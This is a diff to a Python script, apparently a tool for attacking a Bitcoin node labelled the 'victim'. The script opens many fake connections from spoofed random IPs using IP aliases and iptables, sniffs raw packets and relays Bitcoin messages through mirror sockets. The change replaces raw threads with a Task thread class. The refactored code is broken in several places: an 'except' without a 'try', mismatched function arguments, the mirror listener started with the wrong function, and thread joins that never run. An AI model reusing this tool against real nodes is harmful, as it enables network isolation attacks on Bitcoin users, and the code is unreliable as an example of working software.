@@ -1,4 +1,4 @@
-from _thread import start_new_thread
+import threading
 from bitcoin.messages import *
 from bitcoin.net import CAddress
 from io import BytesIO as _BytesIO
@@ -44,6 +44,8 @@ identity_mirror_socket = [] # The mirrored internal connections to Bitcoin Core
 
 # The file where the iptables backup is saved, then restored when the script ends
 iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
+# Keeps track of all threads
+threads = []
 
 # Send commands to the Linux terminal
 def terminal(cmd):
@@ -182,7 +184,8 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 
 	# Listen to the connections for future packets
 	if verbose: print(f'Attaching packet listener to {interface}')
-	try:
+	createTask('Victim identity ' + src_ip, sniff, s, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface)
+	"""try:
 		start_new_thread(sniff, (), {
 			'socket': s,
 			'mirror_socket': mirror_socket,
@@ -193,11 +196,12 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 			'interface': interface
 		})
 	except:
-		print(f'Error: unable to start thread to sniff interface {interface}')
+		print(f'Error: unable to start thread to sniff interface {interface}')"""
 
 	if mirror_socket != None:
 		if verbose: print(f'Attaching mirror packet listener to {interface}')
-		try:
+		createTask('Mirror identity ' + src_ip, sniff, mirror_socket, s, src_ip, src_port, dst_ip, dst_port, interface)
+		"""try:
 			start_new_thread(mirror_sniff, (), {
 				'socket': mirror_socket,
 				'orig_socket': s,
@@ -208,7 +212,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 				'interface': interface
 			})
 		except:
-			print(f'Error: unable to start thread to sniff interface {interface}')
+			print(f'Error: unable to start thread to sniff interface {interface}')"""
 
 
 # Creates a fake connection to the victim
@@ -253,56 +257,48 @@ def mirror_make_fake_connection(socket, interface, src_ip, verbose=True):
 	return s
 
 
-def sniff(socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface):
-	while True:
+def sniff(thread, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface):
+	while not thread.stopped():
 		packet = socket.recv(65565)
-		"""try: # TODO: Make packet_received multithreaded, may require creating a thread class
-		start_new_thread(sniff, (), {
-			'socket': s,
-			'mirror_socket': mirror_socket,
-			'src_ip': src_ip,
-			'src_port': src_port,
-			'dst_ip': dst_ip,
-			'dst_port': dst_port,
-			'interface': interface
-		})"""
+		createTask('Process packet ' + src_ip, packet_received, packet, socket, mirror_socket, dst_ip, dst_port, src_ip, src_port, interface)
+
 	except:
 		print(f'Error: unable to start thread to sniff interface {interface}')
-		if packet_received(packet, socket, mirror_socket, dst_ip, dst_port, src_ip, src_port, interface):
+		if packet_received(thread, packet, socket, mirror_socket, dst_ip, dst_port, src_ip, src_port, interface):
 			break
 
 # Called when a packet is sniffed from the network
 # Return true to end the thread
-def packet_received(msg_raw, socket, mirror_socket, from_ip, from_port, to_ip, to_port, interface):
-	if len(msg_raw) >= 4:
-		is_bitcoin = (msg_raw[0:4] == b'\xf9\xbe\xb4\xd9')
+def packet_received(thread, parent_thread, packet, socket, mirror_socket, from_ip, from_port, to_ip, to_port, interface):
+	if len(packet) >= 4:
+		is_bitcoin = (packet[0:4] == b'\xf9\xbe\xb4\xd9')
 	else:
 		is_bitcoin = False
 
-	if is_bitcoin and len(msg_raw) >= 4+12+4+4:
-		msg_type = msg_raw[4 : 4+12].split(b"\x00", 1)[0].decode()
-		payload_length = struct.unpack(b'<i', msg_raw[4+12 : 4+12+4])[0]
-		payload_checksum = hashlib.sha256(hashlib.sha256(msg_raw[4+12+4+4 : 4+12+4+4+payload_length]).digest()).digest()[:4]
-		payload_valid = (msg_raw[4+12+4 : 4+12+4+4] == payload_checksum)
-		payload_length_valid = (len(msg_raw) - payload_length == 4+12+4+4)
-		# The payload is msg_raw[4+12+4+4:4+12+4+4+payload_length] but we'll let MsgSerializable.from_bytes decode it
+	if is_bitcoin and len(packet) >= 4+12+4+4:
+		msg_type = packet[4 : 4+12].split(b"\x00", 1)[0].decode()
+		payload_length = struct.unpack(b'<i', packet[4+12 : 4+12+4])[0]
+		payload_checksum = hashlib.sha256(hashlib.sha256(packet[4+12+4+4 : 4+12+4+4+payload_length]).digest()).digest()[:4]
+		payload_valid = (packet[4+12+4 : 4+12+4+4] == payload_checksum)
+		payload_length_valid = (len(packet) - payload_length == 4+12+4+4)
+		# The payload is packet[4+12+4+4:4+12+4+4+payload_length] but we'll let MsgSerializable.from_bytes decode it
 	else:
 		msg_type = ''
 		payload_length = 0
 		payload_valid = False
 		payload_length_valid = False
 
-	if not is_bitcoin: return False
-	if not payload_valid: return False
-	if not payload_length_valid: return False
+	if not is_bitcoin: return
+	if not payload_valid: return
+	if not payload_length_valid: return
 
 	# Parse the message payload
-	#msg = MsgSerializable.from_bytes(msg_raw)
+	#msg = MsgSerializable.from_bytes(packet)
 
 	# Relay Bitcoin packets that aren't from the victim
 	print(f'*** Victim message received ** {from_ip} --> {to_ip} ** {msg_type}')
 
-	if mirror_socket == None: return False # If the mirror's socket isn't running, don't bother trying to relay
+	if mirror_socket == None: return # If the mirror's socket isn't running, don't bother trying to relay
 	try:
 		#if msg_type == 'ping':
 		#	pong = msg_pong(bitcoin_protocolversion)
@@ -311,36 +307,36 @@ def packet_received(msg_raw, socket, mirror_socket, from_ip, from_port, to_ip, t
 		if msg_type == 'version': pass # Ignore version
 		elif msg_type == 'verack': pass # Ignore version
 		else:
-			mirror_socket.send(msg_raw) # Relay to the mirror
+			mirror_socket.send(packet) # Relay to the mirror
 
 	except Exception as e:
+		parent_thread.stop()
 		close_connection(socket, mirror_socket, from_ip, from_port, interface)
 		print("Closing socket because of error: " + str(e))
 		make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = False, attempt_number = 3)
-		return True # End the thread
-	return False
+	return
 
-def mirror_sniff(socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
-	while True:
+def mirror_sniff(thread, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
+	while not thread.stopped():
 		packet = socket.recv(65565)
-		if mirror_packet_received(packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
+		if mirror_packet_received(thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
 			break
 
 # Called when a packet is sniffed from the network
 # Return true to end the thread
-def mirror_packet_received(msg_raw, socket, orig_socket, from_ip, from_port, to_ip, to_port, interface):
-	if len(msg_raw) >= 4:
-		is_bitcoin = (msg_raw[0:4] == b'\xf9\xbe\xb4\xd9')
+def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, from_ip, from_port, to_ip, to_port, interface):
+	if len(packet) >= 4:
+		is_bitcoin = (packet[0:4] == b'\xf9\xbe\xb4\xd9')
 	else:
 		is_bitcoin = False
 
-	if is_bitcoin and len(msg_raw) >= 4+12+4+4:
-		msg_type = msg_raw[4 : 4+12].split(b"\x00", 1)[0].decode()
-		payload_length = struct.unpack(b'<i', msg_raw[4+12 : 4+12+4])[0]
-		payload_checksum = hashlib.sha256(hashlib.sha256(msg_raw[4+12+4+4 : 4+12+4+4+payload_length]).digest()).digest()[:4]
-		payload_valid = (msg_raw[4+12+4 : 4+12+4+4] == payload_checksum)
-		payload_length_valid = (len(msg_raw) - payload_length == 4+12+4+4)
-		# The payload is msg_raw[4+12+4+4:4+12+4+4+payload_length] but we'll let MsgSerializable.from_bytes decode it
+	if is_bitcoin and len(packet) >= 4+12+4+4:
+		msg_type = packet[4 : 4+12].split(b"\x00", 1)[0].decode()
+		payload_length = struct.unpack(b'<i', packet[4+12 : 4+12+4])[0]
+		payload_checksum = hashlib.sha256(hashlib.sha256(packet[4+12+4+4 : 4+12+4+4+payload_length]).digest()).digest()[:4]
+		payload_valid = (packet[4+12+4 : 4+12+4+4] == payload_checksum)
+		payload_length_valid = (len(packet) - payload_length == 4+12+4+4)
+		# The payload is packet[4+12+4+4:4+12+4+4+payload_length] but we'll let MsgSerializable.from_bytes decode it
 	else:
 		msg_type = ''
 		payload_length = 0
@@ -348,12 +344,12 @@ def mirror_packet_received(msg_raw, socket, orig_socket, from_ip, from_port, to_
 		payload_length_valid = False
 
 
-	if not is_bitcoin: return False
-	if not payload_valid: return False
-	if not payload_length_valid: return False
+	if not is_bitcoin: return
+	if not payload_valid: return
+	if not payload_length_valid: return
 
 	# Parse the message payload
-	#msg = MsgSerializable.from_bytes(msg_raw)
+	#msg = MsgSerializable.from_bytes(packet)
 
 	# Relay Bitcoin packets that aren't from the victim
 	print(f'*** Mirrored response sent  ** {from_ip} --> {to_ip} ** {msg_type}')
@@ -366,14 +362,14 @@ def mirror_packet_received(msg_raw, socket, orig_socket, from_ip, from_port, to_
 		if msg_type == 'version': pass # Ignore version
 		elif msg_type == 'verack': pass # Ignore version
 		else:
-			orig_socket.send(msg_raw) # Relay to the victim
+			orig_socket.send(packet) # Relay to the victim
 
 	except Exception as e:
 		print("Closing socket because of error: " + str(e))
+		parent_thread.stop()
 		socket.close()
-		return True # End the thread
 
-	return False
+	return
 
 # Initialize the network
 def initialize_network_info():
@@ -433,8 +429,53 @@ def cleanup_ipaliases():
 		print(f'Cleaning up IP alias {ip} on {interface}')
 		terminal(f'sudo ifconfig {interface} {ip} down')
 
+# Run a fuction in parallel to other code
+class Task(threading.Thread):
+	def __init__(self, name, function, *args):
+		assert isinstance(name, str), 'Argument "name" is not a string'
+		assert callable(function), 'Argument "function" is not callable'
+		threading.Thread.__init__(self)
+		self._stop_event = threading.Event()
+
+		self.setName(name)
+		self.function = function
+		self.args = args
+
+	def __str__(self):
+		return f'Task({self.name})'
+
+	def run(self):
+		self.function(self, *self.args)
+		self._stop_event.set()
+
+	def stop(self):
+		self._stop_event.set()
+
+	def stopped(self):
+		return self._stop_event.is_set()
+
+# Creates a new thread and starts it
+def createTask(name, function, *args):
+	task = Task(name, function, *args)
+	threads.append(task)
+	task.start()
+	return task
+
+# Remove any threads that are stopped
+def purgeStoppedThreads():
+	activeThreads = []
+	for thread in threads:
+		if not thread.stopped():
+			activeThreads.append(thread)
+	threads = activeThreads
+
+
+
 # This function is ran when the script is stopped
 def on_close():
+	print('Stopping active threads')
+	for thread in threads:
+		thread.stop()
 	print('Closing open sockets')
 	for socket in identity_socket:
 		socket.close()
@@ -464,6 +505,5 @@ if __name__ == '__main__':
 
 	print(f'\nSUCCESSFUL CONNECTIONS: {len(identity_address)}\n')
 
-	# Prevent the script from terminating when the sniff function is still active
-	while 1:
-		time.sleep(60)
+	# Wait for all threads (sniffers) to end before ending the main thread
+	map(lambda thread: thread.join(), threads)
